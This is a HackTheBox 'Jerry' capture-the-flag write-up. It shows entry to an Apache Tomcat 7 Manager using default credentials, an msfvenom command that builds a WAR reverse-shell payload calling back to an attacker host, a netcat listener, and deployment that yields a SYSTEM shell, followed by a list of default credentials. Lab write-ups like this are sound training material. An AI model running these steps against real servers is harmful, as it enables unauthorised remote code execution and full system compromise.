# Jerry - HackTheBox - Easy

## Summary
Jerry is an easy Windows machine running Apache Tomcat 7.0.88 on port 8080.  The attack path involves accessing the Tomcat Manager using default credentials, uploading a malicious WAR file to gain a reverse shell, and landing directly as SYSTEM — making privilege escalation unnecessary.

## Tools
- nmap
- msfvenom
- netcat

## 1. Enumeration
### Port Scanning

```sh
nmap -Pn -sC -sV -p- <IP>

PORT STATE SERVICE VERSION
8080/tcp open http Apache Tomcat/7.0.88
```

Navigating to `http://<IP>:8080`, we find Apache Tomcat. We click on **Manager App** 
and try default credentials:

| Username | Password |
|----------|----------|
| `tomcat` | `s3cret`  |

Access is granted.


## 2. Exploitation
### Generating the Malicious WAR File

Apache Tomcat Manager allows deploying `.war` (Web Application Archive) files. 
We generate a reverse shell payload:
We generate a `.war`:
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<LPORT> -f war -o revshell.war
```

### Setting Up the Listener

```sh
nc -lvnp <PORT>
```

### Deploying and Triggering

1. In the Manager App, scroll to **"WAR file to deploy"**
2. Upload `revshell.war` → click **Deploy**
3. The app appears in the application list as `/revshell`
4. Navigate to `http://<IP>:8080/revshell/` to trigger the shell

We catch a shell as `SYSTEM` — no privilege escalation needed.

## 3. Lessons Learned
- Apache Tomcat Manager is dangerous when exposed with default or weak credentials.
- WAR file deployment is a well-known RCE vector — always check Tomcat Manager exposure.
- Services running as SYSTEM (common on misconfigured Windows servers) give immediate full access.
- Always try default credentials: `tomcat:s3cret`, `admin:admin`, `tomcat:tomcat`.
